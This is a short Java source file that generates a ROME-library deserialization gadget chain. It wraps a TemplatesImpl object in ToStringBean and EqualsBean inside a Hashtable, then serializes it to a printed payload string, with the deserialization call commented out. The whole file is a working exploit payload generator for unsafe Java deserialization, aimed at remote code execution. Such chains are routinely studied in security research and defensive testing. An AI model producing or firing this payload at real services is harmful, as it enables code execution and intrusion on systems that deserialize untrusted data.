package com.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.util.Hashtable;

public class HashTableChain {
    public static void main(String[] args) throws Exception {
        TemplatesImpl tpl = Utils.getTemplatesImpl();

        ToStringBean toStringBean = new ToStringBean(Templates.class, tpl);

        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);

        Hashtable hashtable= new Hashtable();
        hashtable.put(equalsBean,"0w0");

        String barr = Utils.Serialize(hashtable);
        System.out.println(barr);
//        Utils.UnSerialize(barr);
    }
}
